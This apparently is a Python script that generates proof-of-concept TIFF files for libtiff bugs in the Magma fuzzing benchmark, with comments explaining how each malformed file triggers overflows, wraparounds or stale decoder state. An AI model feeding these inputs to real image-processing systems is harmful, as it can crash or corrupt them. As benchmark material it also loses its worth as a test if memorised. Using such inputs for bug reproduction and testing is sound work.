#!/usr/bin/env python3
"""Write one PoC TIFF per magma libtiff bug into argv[1].

harness_0: TIF001 002 007 008 010 011 012 014
harness_1: TIF005 006 009
harness_2: TIF003 004
TIF013 needs a JBIG-enabled libtiff (libjbig-dev); tif013.tif targets harness_0.

The 4-byte trailer of harness_0/1 inputs is the configuration word (LE),
see support/harness.h; harness_2 inputs end with an op program.
"""
import os
import struct
import sys
import zlib

out = sys.argv[1]

SHORT, LONG, RATIONAL, DOUBLE, LONG8 = 3, 4, 5, 12, 16
FMT = {SHORT: "H", LONG: "I", DOUBLE: "d", LONG8: "Q"}


def tiff(tags, data=b"", big=False):
    """Little-endian TIFF: header, image data at offset 16, then the IFD.

    tags: {tag: (type, [values])}; the value "DATA" is replaced by the offset
    of `data` in the file.
    """
    data_off = 16
    ifd_off = data_off + len(data) + (len(data) & 1)
    ent_size, cnt_fmt, inline = (20, "Q", 8) if big else (12, "I", 4)
    n = len(tags)
    ext_off = ifd_off + (8 if big else 2) + n * ent_size + (8 if big else 4)
    entries, ext = b"", b""
    for tag in sorted(tags):
        typ, vals = tags[tag]
        vals = [data_off if v == "DATA" else v for v in vals]
        raw = struct.pack("<%d%s" % (len(vals), FMT[typ]), *vals)
        if len(raw) <= inline:
            val = raw.ljust(inline, b"\0")
        else:
            val = struct.pack("<" + cnt_fmt, ext_off + len(ext))
            ext += raw + (b"\0" * (len(raw) & 1))
        entries += struct.pack("<HH" + cnt_fmt, tag, typ, len(vals)) + val
    if big:
        hdr = b"II" + struct.pack("<HHHQ", 43, 8, 0, ifd_off)
        ifd = struct.pack("<Q", n) + entries + struct.pack("<Q", 0)
    else:
        hdr = b"II" + struct.pack("<HI", 42, ifd_off)
        ifd = struct.pack("<H", n) + entries + struct.pack("<I", 0)
    body = hdr.ljust(data_off, b"\0") + data + b"\0" * (len(data) & 1)
    return body + ifd + ext


def cfg(v):
    return struct.pack("<I", v)


def w(name, blob):
    with open(os.path.join(out, name), "wb") as f:
        f.write(blob)


def strip_image(w_, h, bps=8, spp=1, photo=1, comp=1, data=b"", extra=None,
                big=False, **kw):
    t = {256: (LONG, [w_]), 257: (LONG, [h]), 258: (SHORT, [bps] * spp),
         259: (SHORT, [comp]), 262: (SHORT, [photo]), 273: (LONG, ["DATA"]),
         277: (SHORT, [spp]), 279: (LONG, [len(data)])}
    t.update(extra or {})
    return tiff(t, data, big)


# TIF001: deflate + horizontal predictor, RGB8 4x1; partial strip read of 5
# bytes (row is 12). harness_0 cfg: access=2, part = 1 + 4.
raw = bytes(range(12))
w("tif001.tif",
  strip_image(4, 1, spp=3, photo=2, comp=8, data=zlib.compress(raw),
              extra={317: (SHORT, [2])}) + cfg(0x0420))

# TIF002: PixarLog 8-bit, 1x1 image in a 16x16 tile. harness_0 cfg: access=1.
pl = zlib.compress(b"\0" * 512)
w("tif002.tif",
  tiff({256: (LONG, [1]), 257: (LONG, [1]), 258: (SHORT, [8]),
        259: (SHORT, [32909]), 262: (SHORT, [1]), 277: (SHORT, [1]),
        322: (LONG, [16]), 323: (LONG, [16]), 324: (LONG, ["DATA"]),
        325: (LONG, [len(pl)])}, pl) + cfg(0x10))

# TIF003: ImageLength 0xffffffff and no RowsPerStrip (one strip, PackBits so
# strip chopping stays out of the way). harness_2 program: set RowsPerStrip=2
# on the handle, read strip 0: stripsperplane = (2^32 - 1 + 1) / 2 wraps to 0.
ops = bytes([4, 8, 2, 0,   1, 0, 0, 0])
w("tif003.tif",
  strip_image(1, 0xFFFFFFFF, comp=32773, data=b"\x00\x00")
  + ops + bytes([len(ops) // 4]))

# TIF007: one uncompressed 10x1 strip claiming 100000 bytes at an offset past
# EOF (so ByteCountLooksBad does not fire). harness_0 cfg: 0.
t = {256: (LONG, [10]), 257: (LONG, [1]), 258: (SHORT, [8]),
     259: (SHORT, [1]), 262: (SHORT, [1]), 273: (LONG, [0x7FFFFFFF]),
     277: (SHORT, [1]), 279: (LONG, [100000])}
w("tif007.tif", tiff(t) + cfg(0))

# TIF008: NeXT 2-bit, image width 4, 16x16 tile; a 63-pixel run.
# harness_0 cfg: access=1.
nx = b"\xff" * 64
w("tif008.tif",
  tiff({256: (LONG, [4]), 257: (LONG, [16]), 258: (SHORT, [2]),
        259: (SHORT, [32766]), 262: (SHORT, [1]), 277: (SHORT, [1]),
        322: (LONG, [16]), 323: (LONG, [16]), 324: (LONG, ["DATA"]),
        325: (LONG, [len(nx)])}, nx) + cfg(0x10))


# TIF010: old-style (LSB-first) LZW, 6x3 8-bit. Row 0 builds 258/259; row 1
# CLEARs and then fails (code 300 after CLEAR) without saving state; row 2
# re-reads row 1's codes with stale free_entp/oldcodep and builds an entry of
# length 1 whose next pointer is the (zeroed) entry 259. harness_0 cfg: 0.
def lzw_compat(codes, nbits=9):
    acc = nb = 0
    outb = bytearray()
    for c in codes:
        acc |= c << nb
        nb += nbits
        while nb >= 8:
            outb.append(acc & 0xFF)
            acc >>= 8
            nb -= 8
    if nb:
        outb.append(acc & 0xFF)
    return bytes(outb)


lz = lzw_compat([256, 65, 258, 259, 67, 260, 256, 300] + [257] * 8) + b"\0" * 32
w("tif010.tif", strip_image(6, 3, comp=5, data=lz) + cfg(0))

# TIF011: gray + 1 extra sample, single-table TransferFunction, printed with
# TIFFPRINT_CURVES. harness_0 cfg: print.
w("tif011.tif",
  strip_image(1, 1, bps=1, spp=2, data=b"\0",
              extra={301: (SHORT, [0, 65535]), 338: (SHORT, [2])})
  + cfg(0x08))

# TIF012: OJPEG, YCbCr, no SamplesPerPixel, SMinSampleValue present: the
# OJPEG fix-up sets SamplesPerPixel=3 in TIFFReadDirectory. harness_0 cfg: 0.
t = {256: (LONG, [8]), 257: (LONG, [8]), 258: (SHORT, [8]),
     259: (SHORT, [6]), 262: (SHORT, [6]), 273: (LONG, ["DATA"]),
     279: (LONG, [16]), 340: (DOUBLE, [0.0])}
w("tif012.tif", tiff(t, b"\0" * 16) + cfg(0))

# TIF014: one uncompressed strip, width 4097 (row > 8 KiB / 2 so one row per
# chopped strip), 1000001 rows, byte count exactly rows * width (TIF007 stays
# quiet), offset past EOF. harness_0 cfg: 0.
t = {256: (LONG, [4097]), 257: (LONG, [1000001]), 258: (SHORT, [8]),
     259: (SHORT, [1]), 262: (SHORT, [1]), 273: (LONG, [0xFFFFFF00]),
     277: (SHORT, [1]), 279: (LONG, [4097 * 1000001])}
w("tif014.tif", tiff(t) + cfg(0))

# TIF005 / TIF006: 4x4 bilevel image re-encoded as SGILog / PixarLog. Neither
# encoder can be set up (photometric is not LogLuv; PixarLog has no 1-bit
# format), the scanline writes fail, and TIFFClose writes the directory.
bil = strip_image(4, 4, bps=1, data=b"\0" * 4)
w("tif005.tif", bil + cfg(4))
w("tif006.tif", bil + cfg(6))

# TIF009: gray + alpha with a single-table TransferFunction, converted with
# ExtraSamples dropped: output has 2 colour samples and NULL tables 1 and 2.
# harness_1 cfg: drop extras.
w("tif009.tif",
  strip_image(1, 1, spp=2, data=b"\0\0",
              extra={301: (SHORT, list(range(0, 65536, 256))),
                     338: (SHORT, [2])}) + cfg(0x40))

# TIF004: harness_2 program: read row 0 of an uncompressed strip, install the
# OJPEG codec on the handle, read row 1 (same strip, no predecode).
ops = bytes([0, 0, 0, 0,   3, 5, 0, 0,   0, 1, 0, 0])
w("tif004.tif",
  strip_image(8, 4, data=b"\0" * 32, extra={278: (LONG, [4])})
  + ops + bytes([len(ops) // 4]))

# TIF013 (JBIG builds only): any JBIG strip read with a partial size smaller
# than the decoded size. A minimal 8x8 BIE is not generated here; any JBIG
# TIFF from the corpus with harness_0 cfg access=2, part=1 works.
